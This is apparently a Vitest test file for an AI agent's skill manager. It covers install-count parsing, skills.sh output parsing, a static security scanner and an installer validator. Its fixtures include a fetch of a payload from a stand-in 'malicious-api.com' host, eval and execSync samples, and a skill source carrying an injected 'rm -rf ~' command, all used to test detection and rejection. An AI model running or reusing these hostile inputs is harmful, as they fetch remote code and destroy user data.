import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { parseInstalls, parseFindOutput } from '../../.agent/skills/total-recall/skills/tr-skill/scripts/find-skills.mjs';
import { scanFile, runScan } from '../../.agent/skills/total-recall/skills/tr-skill/scripts/scan-skill.mjs';
import { installSkill, validateSkillSource, inferSkillName } from '../../.agent/skills/total-recall/skills/tr-skill/scripts/install-skill.mjs';
import { resolveSkillScriptPath } from './skill.mjs';

describe('Sovereign Skill Manager', () => {
  let tempDir;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tr-skill-test-'));
  });

  afterEach(() => {
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  describe('Ratings & Installs Converter', () => {
    it('correctly parses install metric units and converts them to integers', () => {
      expect(parseInstalls('1.7', 'K')).toBe(1700);
      expect(parseInstalls('21.3', 'K')).toBe(21300);
      expect(parseInstalls('2.1', 'M')).toBe(2100000);
      expect(parseInstalls('120', '')).toBe(120);
      expect(parseInstalls('invalid', 'K')).toBe(0);
    });
  });

  describe('skills.sh CLI Output Parser', () => {
    it('successfully parses raw multi-line find output into structured objects', () => {
      const rawOutput = `
Install with npx skills add <owner/repo@skill>

steipete/clawdis@github 1.7K installs
└ https://skills.sh/steipete/clawdis/github

jiulingyun/openclaw-cn@github 21 installs
└ https://skills.sh/jiulingyun/openclaw-cn/github
`;
      const parsed = parseFindOutput(rawOutput);
      
      expect(parsed).toHaveLength(2);
      expect(parsed[0].name).toBe('steipete/clawdis@github');
      expect(parsed[0].installs).toBe(1700);
      expect(parsed[0].installsStr).toBe('1.7K');
      expect(parsed[0].url).toBe('https://skills.sh/steipete/clawdis/github');
      
      expect(parsed[1].name).toBe('jiulingyun/openclaw-cn@github');
      expect(parsed[1].installs).toBe(21);
      expect(parsed[1].url).toBe('https://skills.sh/jiulingyun/openclaw-cn/github');
    });
  });

  describe('Static Security Scanner Auditor', () => {
    it('flags dynamic command injections as CRITICAL risks', () => {
      const badCode = `
        const cmd = 'npm run dev';
        child_process.execSync(\`exec \${cmd}\`);
      `;
      const filePath = path.join(tempDir, 'bad-script.mjs');
      fs.writeFileSync(filePath, badCode, 'utf8');

      const findings = scanFile(filePath);
      const criticals = findings.filter(f => f.severity === 'CRITICAL');
      
      expect(criticals).toHaveLength(1);
      expect(criticals[0].rule).toBe('Dynamic Command Injection');
    });

    it('flags eval/Function evaluations as CRITICAL risks', () => {
      const badCode = `
        const runner = eval('console.log("danger")');
      `;
      const filePath = path.join(tempDir, 'bad-script.mjs');
      fs.writeFileSync(filePath, badCode, 'utf8');

      const findings = scanFile(filePath);
      const criticals = findings.filter(f => f.severity === 'CRITICAL');
      
      expect(criticals).toHaveLength(1);
      expect(criticals[0].rule).toBe('Unsafe Code Evaluation');
    });

    it('flags remote connection hooks as WARNING parameters', () => {
      const netCode = `
        const res = await fetch('https://malicious-api.com/payload');
      `;
      const filePath = path.join(tempDir, 'net-script.mjs');
      fs.writeFileSync(filePath, netCode, 'utf8');

      const findings = scanFile(filePath);
      const warnings = findings.filter(f => f.severity === 'WARNING');
      
      expect(warnings).toHaveLength(1);
      expect(warnings[0].rule).toBe('External HTTP/Network Call');
    });

    it('accepts safe scripts without any findings', () => {
      const safeCode = `
        console.log("Initializing safe total-recall module...");
        const pathRef = path.join(__dirname, 'references');
        const formatted = \`Paths: \${pathRef}\`;
      `;
      const filePath = path.join(tempDir, 'safe-script.mjs');
      fs.writeFileSync(filePath, safeCode, 'utf8');

      const findings = scanFile(filePath);
      expect(findings).toHaveLength(0);
    });

    it('exposes a CLI scanner entrypoint that blocks critical findings', () => {
      const badCode = 'const runner = eval("1 + 1");\n';
      const filePath = path.join(tempDir, 'bad-script.mjs');
      fs.writeFileSync(filePath, badCode, 'utf8');

      const result = runScan(tempDir);
      expect(result.success).toBe(false);
      expect(result.findings.some(f => f.severity === 'CRITICAL')).toBe(true);
    });
  });

  describe('Installer wrapper', () => {
    it('accepts current skills CLI sources and rejects shell metacharacters', () => {
      expect(validateSkillSource('vercel-labs/agent-skills@frontend-design')).toBe(true);
      expect(validateSkillSource('https://github.com/vercel-labs/agent-skills')).toBe(true);
      expect(validateSkillSource('vercel-labs/agent-skills; rm -rf ~')).toBe(false);
    });

    it('infers the skill name from old and current source forms', () => {
      expect(inferSkillName('vercel-labs/agent-skills@frontend-design')).toBe('frontend-design');
      expect(inferSkillName('https://github.com/vercel-labs/agent-skills')).toBe('agent-skills');
    });

    it('supports dry-run install without executing network commands', () => {
      const result = installSkill('vercel-labs/agent-skills@frontend-design', {
        dryRun: true,
        cwd: tempDir,
        agentDir: path.join(tempDir, '.agent'),
      });

      expect(result.success).toBe(true);
      expect(result.command).toEqual(['npx', '-y', 'skills', 'add', 'vercel-labs/agent-skills@frontend-design', '-y']);
    });
  });

  describe('Skill helper resolution', () => {
    it('prefers helper scripts from the active brain', () => {
      const agentDir = path.join(tempDir, '.agent');
      const scriptPath = path.join(agentDir, 'skills', 'total-recall', 'skills', 'tr-skill', 'scripts', 'find-skills.mjs');
      fs.mkdirSync(path.dirname(scriptPath), { recursive: true });
      fs.writeFileSync(scriptPath, 'export const marker = true;\n', 'utf8');

      expect(resolveSkillScriptPath('find-skills.mjs', { agentDir, root: process.cwd() })).toBe(scriptPath);
    });

    it('falls back to the packaged scaffold when active brain helpers are absent', () => {
      const agentDir = path.join(tempDir, 'empty-agent');
      const scriptPath = resolveSkillScriptPath('find-skills.mjs', { agentDir, root: process.cwd() });
      expect(scriptPath).toContain(path.join('scaffold', '.agent', 'skills', 'total-recall', 'skills', 'tr-skill', 'scripts', 'find-skills.mjs'));
    });
  });
});
